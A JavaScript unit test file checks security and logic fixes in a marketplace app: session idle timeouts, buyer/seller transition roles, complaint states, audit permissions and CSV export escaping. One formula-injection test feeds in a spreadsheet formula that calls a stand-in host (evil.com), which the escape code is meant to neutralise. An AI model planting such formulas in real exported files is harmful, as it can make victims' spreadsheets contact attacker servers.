/**
 * Unit Tests: Phase 5 Fixes
 * Covers all FAIL and PARTIAL PASS issues identified in Phase 4 review.
 *
 * Node 18 compatible — no browser APIs required.
 * Uses InMemoryRepository stubs throughout.
 */

import { TestRunner, assert, assertEqual, assertThrowsAsync, InMemoryRepository } from '../setup.js';
import { Roles } from '../../src/domain/enums/roles.js';
import {
  TransactionStatus,
  ComplaintStatus,
} from '../../src/domain/enums/statuses.js';
import { createSession, validateSession } from '../../src/domain/policies/sessionPolicy.js';
import { Permissions, RolePermissions } from '../../src/domain/enums/permissions.js';
import { requirePermission } from '../../src/domain/policies/permissionGuard.js';
import { ValidationError, AuthorizationError } from '../../src/utils/errors.js';

// Pre-load service modules that tests need to inspect (top-level await)
const { TransactionService } = await import('../../src/services/TransactionService.js');
const { AuditService } = await import('../../src/services/AuditService.js');
const { AnalyticsService } = await import('../../src/services/AnalyticsService.js');

const suite = new TestRunner('Phase 5: All Critical and Partial Fixes');

// ── Session factories ──
function buyerSession(id = 'buyer-1') { return createSession(id, [Roles.USER]); }
function sellerSession(id = 'seller-1') { return createSession(id, [Roles.USER]); }
function adminSession(id = 'admin-1') { return createSession(id, [Roles.ADMIN]); }
function supportSession(id = 'support-1') { return createSession(id, [Roles.SUPPORT_AGENT]); }
function userSession(id = 'user-1') { return createSession(id, [Roles.USER]); }

// ── CSV cell escape helper (mirrors fixed ExportImportService.toCSV logic) ──
function escapeCsvCell(val) {
  if (val === null || val === undefined) return '';
  let str = typeof val === 'object' ? JSON.stringify(val) : String(val);
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `\t${str}`;
  }
  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\t')) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

// ─────────────────────────────────────────────
// F-1: TransactionService.getByThreadId
// ─────────────────────────────────────────────

suite.test('F-1: TransactionService exposes getByThreadId method', () => {
  assert(typeof TransactionService.getByThreadId === 'function',
    'getByThreadId must be a function on TransactionService');
});

suite.test('F-1: getByThreadId is distinct from getById', () => {
  assert(TransactionService.getByThreadId !== TransactionService.getById,
    'getByThreadId and getById must be separate methods');
});

// ─────────────────────────────────────────────
// F-2: Session persistence
// ─────────────────────────────────────────────

suite.test('F-2: createSession produces lastActivityAt on creation', () => {
  const session = createSession('user-1', [Roles.USER]);
  assert(session.lastActivityAt > 0, 'Session must have lastActivityAt on creation');
  assert(typeof session.lastActivityAt === 'number', 'lastActivityAt must be a number');
});

suite.test('F-2: validateSession rejects session with stale lastActivityAt (>30min)', async () => {
  const staleSession = {
    userId: 'user-1',
    roles: [Roles.USER],
    createdAt: Date.now(),
    lastActivityAt: Date.now() - (31 * 60 * 1000), // 31 minutes ago
    tokenId: 'test-token',
  };
  await assertThrowsAsync(
    () => { validateSession(staleSession); return Promise.resolve(); },
    'AuthenticationError',
    'idle timeout'
  );
});

suite.test('F-2: fresh session passes validateSession', () => {
  const session = createSession('user-1', [Roles.USER]);
  const returned = validateSession(session); // returns session on success
  assertEqual(returned.userId, 'user-1', 'validateSession must return the session on success');
});

suite.test('F-2: session with recently-updated lastActivityAt passes validation', () => {
  const now = Date.now();
  const session = {
    userId: 'user-1',
    roles: [Roles.USER],
    createdAt: now - (2 * 60 * 60 * 1000), // 2 hours old
    lastActivityAt: now - (5 * 60 * 1000),  // active 5 min ago
    tokenId: 'test-token',
  };
  const returned = validateSession(session);
  assertEqual(returned.userId, 'user-1', 'Active session must pass validation and return the session');
});

// ─────────────────────────────────────────────
// F-3: Transaction role enforcement per step
// ─────────────────────────────────────────────

suite.test('F-3: _requireRoleForTransition is defined on TransactionService', () => {
  assert(typeof TransactionService._requireRoleForTransition === 'function',
    '_requireRoleForTransition must exist as a private method');
});

suite.test('F-3: buyer cannot move inquiry → reserved (seller-only)', () => {
  const buyer = buyerSession('buyer-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  try {
    TransactionService._requireRoleForTransition(buyer, tx, TransactionStatus.RESERVED);
    assert(false, 'Must throw for buyer trying to reserve');
  } catch (e) {
    assert(e.name === 'ValidationError', `Expected ValidationError, got ${e.name}: ${e.message}`);
    assert(e.message.toLowerCase().includes('seller'),
      `Error must mention seller role. Got: "${e.message}"`);
  }
});

suite.test('F-3: seller can move inquiry → reserved', () => {
  const seller = sellerSession('seller-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  // Must complete without throwing — if it throws the test fails automatically
  let threw = false;
  try { TransactionService._requireRoleForTransition(seller, tx, TransactionStatus.RESERVED); }
  catch { threw = true; }
  assert(!threw, 'Seller must not be blocked from moving to RESERVED');
});

suite.test('F-3: seller cannot move reserved → agreed (buyer-only)', () => {
  const seller = sellerSession('seller-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  try {
    TransactionService._requireRoleForTransition(seller, tx, TransactionStatus.AGREED);
    assert(false, 'Must throw for seller trying to agree');
  } catch (e) {
    assert(e.name === 'ValidationError', `Expected ValidationError, got ${e.name}: ${e.message}`);
    assert(e.message.toLowerCase().includes('buyer'),
      `Error must mention buyer role. Got: "${e.message}"`);
  }
});

suite.test('F-3: buyer can move reserved → agreed', () => {
  const buyer = buyerSession('buyer-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  let threw = false;
  try { TransactionService._requireRoleForTransition(buyer, tx, TransactionStatus.AGREED); }
  catch { threw = true; }
  assert(!threw, 'Buyer must not be blocked from confirming agreement');
});

suite.test('F-3: seller cannot move agreed → completed (buyer-only)', () => {
  const seller = sellerSession('seller-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  try {
    TransactionService._requireRoleForTransition(seller, tx, TransactionStatus.COMPLETED);
    assert(false, 'Must throw for seller trying to complete');
  } catch (e) {
    assert(e.name === 'ValidationError', `Expected ValidationError, got ${e.name}: ${e.message}`);
  }
});

suite.test('F-3: buyer can move agreed → completed', () => {
  const buyer = buyerSession('buyer-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  let threw = false;
  try { TransactionService._requireRoleForTransition(buyer, tx, TransactionStatus.COMPLETED); }
  catch { threw = true; }
  assert(!threw, 'Buyer must not be blocked from completing transaction');
});

suite.test('F-3: buyer can cancel (no role restriction on CANCELED)', () => {
  const buyer = buyerSession('buyer-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  let threw = false;
  try { TransactionService._requireRoleForTransition(buyer, tx, TransactionStatus.CANCELED); }
  catch { threw = true; }
  assert(!threw, 'Buyer must be allowed to cancel');
});

suite.test('F-3: seller can cancel (no role restriction on CANCELED)', () => {
  const seller = sellerSession('seller-1');
  const tx = { buyerId: 'buyer-1', sellerId: 'seller-1' };
  let threw = false;
  try { TransactionService._requireRoleForTransition(seller, tx, TransactionStatus.CANCELED); }
  catch { threw = true; }
  assert(!threw, 'Seller must be allowed to cancel');
});

// ─────────────────────────────────────────────
// F-4: Complaint transaction state restrictions
// ─────────────────────────────────────────────

suite.test('F-4: INQUIRY is not a valid complaint state', () => {
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(!validStates.includes(TransactionStatus.INQUIRY),
    'INQUIRY must not be valid for complaints');
});

suite.test('F-4: RESERVED is not a valid complaint state', () => {
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(!validStates.includes(TransactionStatus.RESERVED),
    'RESERVED must not be valid for complaints');
});

suite.test('F-4: CANCELED is not a valid complaint state', () => {
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(!validStates.includes(TransactionStatus.CANCELED),
    'CANCELED must not be valid for complaints');
});

suite.test('F-4: AGREED is a valid complaint state', () => {
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(validStates.includes(TransactionStatus.AGREED),
    'AGREED must be valid for complaints');
});

suite.test('F-4: COMPLETED is a valid complaint state', () => {
  const validStates = [TransactionStatus.AGREED, TransactionStatus.COMPLETED];
  assert(validStates.includes(TransactionStatus.COMPLETED),
    'COMPLETED must be valid for complaints');
});

suite.test('F-4: duplicate complaint detection from same user on same transaction', async () => {
  const repo = new InMemoryRepository();
  await repo.create({
    id: 'c-1', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.OPEN, createdAt: Date.now(),
  });

  const existing = await repo.getByIndex('transactionId', 'tx-1');
  const dup = existing.find(c => c.userId === 'buyer-1');
  assert(!!dup, 'Duplicate detection must find the existing complaint');
});

suite.test('F-4: second participant (seller) can still file on same transaction', async () => {
  const repo = new InMemoryRepository();
  await repo.create({
    id: 'c-1', userId: 'buyer-1', transactionId: 'tx-1',
    status: ComplaintStatus.OPEN, createdAt: Date.now(),
  });

  const existing = await repo.getByIndex('transactionId', 'tx-1');
  const sellerDup = existing.find(c => c.userId === 'seller-1');
  assert(!sellerDup, 'Seller has not yet filed — must not be blocked');
});

// ─────────────────────────────────────────────
// P-2: Sessions store protected from import
// ─────────────────────────────────────────────

suite.test('P-2: sessions and auditLogs are in PROTECTED_STORES', () => {
  const PROTECTED = new Set(['auditLogs', 'sessions']);
  assert(PROTECTED.has('sessions'), 'sessions must be protected');
  assert(PROTECTED.has('auditLogs'), 'auditLogs must be protected');
});

suite.test('P-2: import loop skips protected stores', async () => {
  const PROTECTED = new Set(['auditLogs', 'sessions']);
  const sessionsRepo = new InMemoryRepository();
  await sessionsRepo.create({ userId: 'user-1', tokenId: 'original-token' });

  const fakeSnapshot = { sessions: [{ userId: 'injected', tokenId: 'evil-token' }] };
  const storeMap = { sessions: sessionsRepo };

  for (const [name, repo] of Object.entries(storeMap)) {
    if (PROTECTED.has(name)) continue;
    if (fakeSnapshot[name]) {
      await repo.clear();
      await repo.bulkPut(fakeSnapshot[name]);
    }
  }

  const all = await sessionsRepo.getAll();
  assertEqual(all.length, 1, 'Sessions repo must retain original record');
  assertEqual(all[0].tokenId, 'original-token', 'Original token must survive');
});

// ─────────────────────────────────────────────
// P-3: Roles enum used in role checks
// ─────────────────────────────────────────────

suite.test('P-3: Roles.SUPPORT_AGENT matches expected string value', () => {
  assertEqual(Roles.SUPPORT_AGENT, 'support_agent');
});

suite.test('P-3: Roles.ADMIN matches expected string value', () => {
  assertEqual(Roles.ADMIN, 'admin');
});

suite.test('P-3: role check via Roles enum correctly identifies support agent', () => {
  const sess = supportSession();
  const elevated = sess.roles.includes(Roles.SUPPORT_AGENT) || sess.roles.includes(Roles.ADMIN);
  assert(elevated, 'Support agent must be elevated via enum check');
});

suite.test('P-3: role check correctly rejects regular user', () => {
  const sess = userSession();
  const elevated = sess.roles.includes(Roles.SUPPORT_AGENT) || sess.roles.includes(Roles.ADMIN);
  assert(!elevated, 'Regular user must not be elevated');
});

// ─────────────────────────────────────────────
// P-4: Refund requires investigable complaint state
// ─────────────────────────────────────────────

suite.test('P-4: OPEN complaint blocks refund request', () => {
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  assert(!refundableStates.includes(ComplaintStatus.OPEN), 'OPEN blocks refund');
});

suite.test('P-4: INVESTIGATING complaint allows refund', () => {
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  assert(refundableStates.includes(ComplaintStatus.INVESTIGATING), 'INVESTIGATING allows refund');
});

suite.test('P-4: RESOLVED complaint allows refund', () => {
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  assert(refundableStates.includes(ComplaintStatus.RESOLVED), 'RESOLVED allows refund');
});

suite.test('P-4: REJECTED complaint does not allow refund', () => {
  const refundableStates = [ComplaintStatus.INVESTIGATING, ComplaintStatus.RESOLVED];
  assert(!refundableStates.includes(ComplaintStatus.REJECTED), 'REJECTED blocks refund');
});

// ─────────────────────────────────────────────
// P-5: AuditService.getAll has internal guard
// ─────────────────────────────────────────────

suite.test('P-5: AuditService.getAll accepts a session parameter', () => {
  assertEqual(AuditService.getAll.length, 1,
    'AuditService.getAll must declare exactly 1 parameter');
});

suite.test('P-5: AuditService.getAll rejects null session', async () => {
  await assertThrowsAsync(
    () => AuditService.getAll(null),
    'AuthenticationError'
  );
});

suite.test('P-5: ADMIN has ADMIN_VIEW_AUDIT permission', () => {
  const adminPerms = RolePermissions[Roles.ADMIN];
  assert(adminPerms.includes(Permissions.ADMIN_VIEW_AUDIT),
    'ADMIN must have ADMIN_VIEW_AUDIT permission');
});

suite.test('P-5: USER does not have ADMIN_VIEW_AUDIT permission', () => {
  const userPerms = RolePermissions[Roles.USER];
  assert(!userPerms.includes(Permissions.ADMIN_VIEW_AUDIT),
    'USER must not have ADMIN_VIEW_AUDIT permission');
});

suite.test('P-5: requirePermission throws for user calling audit view', () => {
  const user = userSession();
  try {
    requirePermission(user, Permissions.ADMIN_VIEW_AUDIT);
    assert(false, 'Must throw AuthorizationError');
  } catch (e) {
    assert(e.name === 'AuthorizationError',
      `Expected AuthorizationError, got ${e.name}`);
  }
});

// ─────────────────────────────────────────────
// P-6: Analytics handling time uses resolvedAt
// ─────────────────────────────────────────────

suite.test('P-6: resolvedAt - createdAt gives correct handling time', () => {
  const now = Date.now();
  const complaint = {
    status: ComplaintStatus.RESOLVED,
    createdAt: now - (4 * 60 * 60 * 1000), // 4 hours ago
    resolvedAt: now - (1 * 60 * 60 * 1000), // resolved 1 hour ago
    updatedAt: now,                           // updatedAt ≠ resolvedAt
  };
  const handlingMs = complaint.resolvedAt - complaint.createdAt;
  assertEqual(handlingMs, 3 * 60 * 60 * 1000, 'Handling time must be 3 hours');
});

suite.test('P-6: updatedAt - createdAt gives wrong result (old formula)', () => {
  const now = Date.now();
  const complaint = {
    createdAt: now - (4 * 60 * 60 * 1000),
    resolvedAt: now - (1 * 60 * 60 * 1000),
    updatedAt: now,
  };
  const wrongMs = complaint.updatedAt - complaint.createdAt;   // 4 hours (wrong)
  const correctMs = complaint.resolvedAt - complaint.createdAt; // 3 hours (correct)
  assert(wrongMs !== correctMs, 'updatedAt formula must differ from resolvedAt formula');
  assert(correctMs < wrongMs, 'resolvedAt gives shorter, more accurate handling time');
});

suite.test('P-6: complaints without resolvedAt excluded from avg calc', () => {
  const complaints = [
    { id: 'c-1', status: ComplaintStatus.RESOLVED, resolvedAt: null, createdAt: 1 },
    { id: 'c-2', status: ComplaintStatus.OPEN, resolvedAt: null, createdAt: 1 },
    { id: 'c-3', status: ComplaintStatus.REJECTED, resolvedAt: null, createdAt: 1 },
  ];
  const eligible = complaints.filter(c =>
    (c.status === ComplaintStatus.RESOLVED || c.status === ComplaintStatus.REJECTED) &&
    c.resolvedAt && c.createdAt
  );
  assertEqual(eligible.length, 0,
    'Complaints without resolvedAt must be excluded from avg calc');
});

suite.test('P-6: resolvedAt set on RESOLVED transition', () => {
  const complaint = { status: ComplaintStatus.INVESTIGATING, resolvedAt: null };
  const newStatus = ComplaintStatus.RESOLVED;
  if (newStatus === ComplaintStatus.RESOLVED || newStatus === ComplaintStatus.REJECTED) {
    complaint.resolvedAt = Date.now();
  }
  assert(complaint.resolvedAt !== null, 'resolvedAt must be set on RESOLVED');
  assert(complaint.resolvedAt > 0, 'resolvedAt must be a valid timestamp');
});

suite.test('P-6: resolvedAt set on REJECTED transition', () => {
  const complaint = { status: ComplaintStatus.INVESTIGATING, resolvedAt: null };
  const newStatus = ComplaintStatus.REJECTED;
  if (newStatus === ComplaintStatus.RESOLVED || newStatus === ComplaintStatus.REJECTED) {
    complaint.resolvedAt = Date.now();
  }
  assert(complaint.resolvedAt !== null, 'resolvedAt must be set on REJECTED');
});

// ─────────────────────────────────────────────
// P-7: CSV formula injection prevention
// ─────────────────────────────────────────────

suite.test('P-7: = prefix is neutralized', () => {
  const escaped = escapeCsvCell('=IMPORTDATA("http://evil.com")');
  assert(!escaped.startsWith('='), 'Must not start with =');
});

suite.test('P-7: + prefix is neutralized', () => {
  assert(!escapeCsvCell('+100').startsWith('+'), 'Must not start with +');
});

suite.test('P-7: - prefix is neutralized', () => {
  assert(!escapeCsvCell('-999').startsWith('-'), 'Must not start with -');
});

suite.test('P-7: @ prefix is neutralized', () => {
  assert(!escapeCsvCell('@SUM(A1)').startsWith('@'), 'Must not start with @');
});

suite.test('P-7: normal text is unchanged', () => {
  assertEqual(escapeCsvCell('Normal value'), 'Normal value');
});

suite.test('P-7: null returns empty string', () => {
  assertEqual(escapeCsvCell(null), '');
});

suite.test('P-7: comma-containing text is still quoted', () => {
  const result = escapeCsvCell('hello, world');
  assert(result.startsWith('"'), 'Comma value must be quoted');
  assert(result.endsWith('"'), 'Comma value must be quoted');
});

suite.test('P-7: dangerous value is both neutralized and quoted (tab triggers quoting)', () => {
  const result = escapeCsvCell('=SUM(A:A)');
  // After tab prefix: "\t=SUM(A:A)" — contains tab → gets quoted
  assert(result.startsWith('"'), 'Formula injection value must be quoted after tab prefix');
  assert(!result.includes('=SUM') || result.startsWith('"'), 'Formula must be wrapped in quotes');
});

// ─────────────────────────────────────────────
// M-3: Promise.all in getMyTransactions
// ─────────────────────────────────────────────

suite.test('M-3: TransactionService.getMyTransactions is still accessible', () => {
  assert(typeof TransactionService.getMyTransactions === 'function',
    'getMyTransactions must exist after Promise.all refactor');
});

// ─────────────────────────────────────────────
// M-4: computeTrends throws on unknown metric
// ─────────────────────────────────────────────

suite.test('M-4: computeTrends throws ValidationError for unknown metric name', async () => {
  const admin = adminSession();
  await assertThrowsAsync(
    () => AnalyticsService.computeTrends(admin, { metric: 'revenue' }),
    'ValidationError',
    'Unknown trend metric'
  );
});

suite.test('M-4: computeTrends throws for empty metric string', async () => {
  const admin = adminSession();
  await assertThrowsAsync(
    () => AnalyticsService.computeTrends(admin, { metric: '' }),
    'ValidationError'
  );
});

// ─────────────────────────────────────────────
// Node 18 compatibility checks
// ─────────────────────────────────────────────

suite.test('Node18: crypto global is available', () => {
  assert(typeof crypto !== 'undefined', 'crypto must be available in Node 18');
});

suite.test('Node18: crypto.randomUUID produces valid UUIDs', () => {
  const uuid = crypto.randomUUID();
  assert(typeof uuid === 'string', 'UUID must be a string');
  assertEqual(uuid.length, 36, 'UUID must be 36 chars');
  const parts = uuid.split('-');
  assertEqual(parts.length, 5, 'UUID must have 5 hyphen-separated parts');
});

suite.test('Node18: TextEncoder is available and encodes correctly', () => {
  const enc = new TextEncoder();
  const bytes = enc.encode('hello');
  assertEqual(bytes.length, 5, 'TextEncoder must encode ASCII bytes correctly');
});

suite.test('Node18: createSession runs without browser environment', () => {
  const session = createSession('u-1', [Roles.USER]);
  assert(session.userId === 'u-1', 'userId must match');
  assert(Array.isArray(session.roles), 'roles must be array');
  assert(session.createdAt > 0, 'createdAt must be positive');
  assert(typeof session.tokenId === 'string' && session.tokenId.length > 0, 'tokenId must exist');
});

suite.test('Node18: InMemoryRepository full CRUD without IndexedDB', async () => {
  const repo = new InMemoryRepository();
  await repo.create({ id: 'r-1', value: 'original' });
  const found = await repo.getById('r-1');
  assertEqual(found.value, 'original', 'getById must return created record');
  await repo.update({ id: 'r-1', value: 'modified' });
  const updated = await repo.getById('r-1');
  assertEqual(updated.value, 'modified', 'update must persist');
  await repo.delete('r-1');
  const deleted = await repo.getById('r-1');
  assert(deleted === null, 'delete must remove record');
});

suite.test('Node18: InMemoryRepository.getByIndex works correctly', async () => {
  const repo = new InMemoryRepository();
  await repo.create({ id: 'a', userId: 'u-1', val: 1 });
  await repo.create({ id: 'b', userId: 'u-1', val: 2 });
  await repo.create({ id: 'c', userId: 'u-2', val: 3 });
  const u1Items = await repo.getByIndex('userId', 'u-1');
  assertEqual(u1Items.length, 2, 'Must return 2 items for u-1');
});

suite.test('Node18: requirePermission works without browser globals', () => {
  const admin = adminSession();
  // requirePermission returns undefined on success — verify it doesn't throw
  let threw = false;
  try { requirePermission(admin, Permissions.ADMIN_VIEW_AUDIT); }
  catch { threw = true; }
  assert(!threw, 'Admin permission check must not throw in Node environment');
  // Also verify admin CAN be granted the permission
  const adminPerms = RolePermissions[Roles.ADMIN];
  assert(adminPerms.includes(Permissions.ADMIN_VIEW_AUDIT),
    'ADMIN must have ADMIN_VIEW_AUDIT in RolePermissions');
});

suite.test('Node18: ValidationError constructor works in Node', () => {
  const err = new ValidationError('field error', { field: 'required' });
  assertEqual(err.name, 'ValidationError');
  assertEqual(err.message, 'field error');
});

suite.test('Node18: AuthorizationError is thrown by requirePermission for user', () => {
  const user = userSession();
  try {
    requirePermission(user, Permissions.ADMIN_VIEW_AUDIT);
    assert(false, 'Must throw');
  } catch (e) {
    assert(e.name === 'AuthorizationError',
      `Expected AuthorizationError, got ${e.name}`);
  }
});

const results = await suite.run();
process.exitCode = results.failed > 0 ? 1 : 0;
